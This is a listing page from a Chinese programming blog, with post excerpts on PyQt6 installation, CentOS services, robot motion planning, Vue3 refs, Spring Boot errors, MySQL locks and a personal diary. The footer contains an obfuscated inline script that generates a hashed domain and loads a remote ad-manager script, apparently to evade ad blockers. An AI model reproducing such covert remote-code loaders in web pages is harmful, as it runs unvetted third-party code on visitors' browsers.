	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54fe7528a1e035608d73958112732083/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2aee538d5cb639c47f8ba3f9b57ba1b3/" rel="bookmark">
			Windows11 python3.12 安装pyqt6 pyqt6-tools
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows11 python3.12 安装pyqt6比较容易，但pyqt6-tools一直安装不上去。出错信息如下：
(venv) PS D:\python_project\pyqt6&gt; pip install pyqt6-tools Collecting pyqt6-tools Using cached pyqt6_tools-6.4.2.3.3-py3-none-any.whl (29 kB) Collecting click (from pyqt6-tools) Using cached click-8.1.7-py3-none-any.whl.metadata (3.0 kB) Collecting pyqt6==6.4.2 (from pyqt6-tools) Using cached PyQt6-6.4.2-cp37-abi3-win_amd64.whl (6.4 MB) INFO: pip is looking at multiple versions of pyqt6-tools to determine which version is compatible with other requirements. This could take a while. Collecting pyqt6-tools Using cached pyqt6_tools-6.3.1.3.3-py3-none-any.whl (29 kB) Collecting pyqt6==6.3.1 (from pyqt6-tools) Using cached PyQt6-6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2aee538d5cb639c47f8ba3f9b57ba1b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8828c67a0b4adfe3bd0ccab0505fe92c/" rel="bookmark">
			centos7查看开机自启服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 systemctl list-unit-files --type=service | grep enabled 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71f22d2841f0a004d3bae93b306dce05/" rel="bookmark">
			移动机器人路径规划（四）--- 考虑机器人模型下的运动规划KINODYNAMIC PATHFINDING
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 动力学概念简介
2 State Lattice Planning
3 Boundary Value Problem
4 混合A*算法 Hybrid A*
5 Kinodynamic RRT*
1 动力学概念简介 一种生成机器人的运动同时受限制于运动学的约束（避障）以及动力学的约束（在速度加速度力的约束），既要保证运动的安全性（避障）还要保证微分的约束（力、加速度的约束）。
真正的机器人是无法当作质点处理的。不可能像RRT*那样走直线的。
做运动规划时也要考虑轨迹优化，而不单单在后端。（需要过渡，有个好的初值）。
并且很重要的，轨迹往往只能在局部被优化，看下面右面的紫色和绿色就可以。（虚线是优化过后的路径）
这是一些经典的运动模型：
http://planning.cs.uiuc.edu/node659.htmlhttp://planning.cs.uiuc.edu/node659.html 下面是简化的小车的模型：
小车模型http://planning.cs.uiuc.edu/node658.html
2 State Lattice Planning We have many weapons to attack graph search.
Assume the robot a mass point is not satisfactory any more.
We now require a graph with feasible motion connections.
We manually create (build) a graph with all edges executable by the robot.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71f22d2841f0a004d3bae93b306dce05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/244a33aa892ca47934b2e93c778f9a8c/" rel="bookmark">
			Vue3 动态设置 ref
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 在一些场景，ref设置是未知的需要根据动态数据来决定，如表格中的input框需要我们主动聚焦，就需要给每一个input设置一个ref，进而进行聚焦操作。
Demo 点击下面截图中的编辑按钮，自动聚焦到相应的输入框中。
&lt;template&gt; &lt;!-- 动态ref --&gt; &lt;div class="test_ref"&gt; &lt;div v-for="item in 9" :key="item"&gt; &lt;span&gt;{{ item }}&lt;/span&gt; &lt;!-- 动态设置ref --&gt; &lt;el-input v-model="inputVal" placeholder="Please input" :ref="(el:refItem) =&gt; handleSetInputMap(el, item)" /&gt; &lt;el-button type="primary" :icon="Edit" @click="handleEdit(item)" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script lang="ts" setup&gt; import { ref } from "vue"; import { Edit } from "@element-plus/icons-vue"; import { ComponentPublicInstance } from "vue"; type refItem = Element | ComponentPublicInstance | null; const inputVal = ref(); const inputRefMap = ref({}); /** 编辑 */ const handleEdit = (item: number) =&gt; { // 若输入框此时还没有渲染出来，如先隐藏再触发显示 需要使用nextTick进行聚焦 inputRefMap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/244a33aa892ca47934b2e93c778f9a8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d2f250d9ad146b81000c14b90ea2634/" rel="bookmark">
			页面报错：“This application has no explicit mapping for error, so you are seeing this as a fallback.”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 页面报错：“This application has no explicit mapping for /error, so you are seeing this as a fallback.” 1.具体报错如下： 2.可能原因有： Application启动类的位置不对，要将Application类放在最外侧，即包含所有子包Controller的url路径错误未添加spring-boot-starter-thymeleaf的jar包或yml文件中关于视图解析器的配置问题未开启静态资源映射 参考：https://blog.csdn.net/weixin_44299027/article/details/93380344
3.本人问题：未开启静态资源映射 4.解决办法：配置如下配置类 @Configuration @Slf4j public class WebMvcConfig extends WebMvcConfigurationSupport { @Override protected void addResourceHandlers(ResourceHandlerRegistry registry) { log.info("静态资源映射..."); } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0e12e59e803473da7810356daedf356/" rel="bookmark">
			MySQL如何查看锁表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在MySQL数据库中，当多个事务同时请求对同一行数据进行修改时，就会发生锁表现象。锁表可以确保数据的一致性和完整性，但如果锁定时间过长或者锁定范围过大，就可能导致性能问题。因此，了解如何查看和分析锁表情况对于优化数据库性能至关重要。
在本文中，我们将讨论如何使用MySQL来查看锁表。我们将涵盖以下几个方面：
1、查看当前的锁表情况
2、查看被阻塞的事务
3、查看事务等待的锁资源
4、查看锁表的进程列表
1. 查看当前的锁表情况 要查看当前的锁表情况，可以使用MySQL的SHOW FULL PROCESSLIST命令。该命令会显示当前执行的所有线程以及它们的状态和正在执行的查询。
SHOW FULL PROCESSLIST; 该命令的输出结果包含以下几个重要的列：
Id：线程的唯一标识符
User：连接数据库的用户名
Host：连接数据库的主机名
db：当前连接的数据库
Command：线程正在执行的命令
Time：线程已经执行的时间
State：线程的当前状态
Info：线程正在执行的查询语句
通过观察State列，我们可以找出正在等待锁资源或者正在锁定其他事务的线程。其中，Waiting for table metadata lock表示线程正在等待表的元数据锁，Waiting for table level lock表示线程正在等待表级别的锁，Waiting for lock表示线程正在等待其他锁。
2. 查看被阻塞的事务 要查看被阻塞的事务，可以使用MySQL的SHOW ENGINE INNODB STATUS命令。该命令会显示InnoDB存储引擎的状态信息，包括当前的锁表情况。
SHOW ENGINE INNODB STATUS; 该命令的输出结果包含了大量的信息，其中与锁有关的部分位于LATEST DETECTED DEADLOCK和TRANSACTIONS之间。
在LATEST DETECTED DEADLOCK部分，可以找到最近被检测到的死锁信息。它会显示每个事务的ID、等待的锁资源、被阻塞的事务以及每个事务正在执行的SQL语句。
在TRANSACTIONS部分，可以找到当前执行的事务列表。它会显示每个事务的ID、等待的锁资源、事务的状态以及每个事务正在执行的SQL语句。
3. 查看事务等待的锁资源 要查看事务等待的锁资源，可以使用MySQL的SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS;命令。该命令会显示当前事务正在等待的锁资源。
SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; 该命令的输出结果包含了当前事务等待的锁资源的相关信息，包括事务ID、锁的类型、锁的模式、被锁定的对象（表、页等）以及锁的状态。
4. 查看锁表的进程列表 要查看锁表的进程列表，可以使用MySQL的SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS;命令。该命令会显示正在等待锁资源的事务以及正在持有锁资源的事务。
SELECT * FROM INFORMATION_SCHEMA.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0e12e59e803473da7810356daedf356/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1d9406e1d383ecf480bf4d9d74287d6/" rel="bookmark">
			【完结】囚生CYの备忘录（20231014~20231117）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		序言 代有才人出，我们这一辈也已经老了。
邂逅花有重开日
断路人无再会时
月明林下寄旧诗
水佩风裳知不知？
罢了。
文章目录 序言202210142023101520231016~2023101720231018~2023101920231020~20231021202310222023102320231024202310252023102620231027~20231028202310302023103120231101~2023110320231104~2023110520231106~2023110820231109~2023111020231111~2023111220231113~2023111420231115~2023111620231117 20221014 本以为下午怡宝的比赛至少是能跑到前三，结果连前五都没摸到，赛前都知道路线不可能有5km，因为即便是绕着主校区最外沿跑一圈也才4km出头，我估摸着是2500米，实际上只有1700米，所以就是全程冲刺，但因为急转弯太多，亏了太多力气，加上年纪大不中用了，实在是没能冲得过几个新生，嘉伟不到5分钟就杀死了比赛，新来的崔洲宸第二，宋镇均第三，退伍生第五，还有一个不认识的是第四，我最后快到终点前是第六，听到王炳杰在后面跟着我，我以为第六还是能拿到手环的（他特别想要），就在终点前把第六让给他了，用时5分40秒，结果都是三等奖，属实难蚌，难兄难弟，但好歹有一箱水和蓝牙跳绳，我也不是很需要手环。后面还有个周俊呈第九，他现在无氧水平也算是提升了不少，但还是力量太差，注定很难有很大突破。卢星雨和丁古丽分列女子前二，她俩确实跑得很勤快。虽然一定程度上是因为距离太短，撞上无氧耐力的短板，但跑得确实笨重（这两天体重有点反弹，快71kg了，之前一直都是69kg上下），身体休息恢复得不好，怕再难以恢复到巅峰，而且今晚喉咙开始疼，大概是受凉了，下午跑的时候喉咙就痒的不停咳，明早的二工大的10km路跑赛很悬，准备跟着宋镇均混了，他这小子两周不跑还能这么快，B话是一句都不能信。 gradio@request
import gradio as gr def echo(text, request: gr.Request): if request: print("Request headers dictionary:", request.headers) print("IP address:", request.client.host) print("Query parameters:", dict(request.query_params)) return text io = gr.Interface(echo, "textbox", "textbox").launch() import gradio as gr def predict(text, request: gr.Request): headers = request.headers host = request.client.host user_agent = request.headers["user-agent"] return { "ip": host, "user_agent": user_agent, "headers": headers, } gr.Interface(predict, "text", "json").queue().launch() 20231015 Unirun 10K成绩38’26"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1d9406e1d383ecf480bf4d9d74287d6/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/33/">«</a>
	<span class="pagination__item pagination__item--current">34/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/35/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>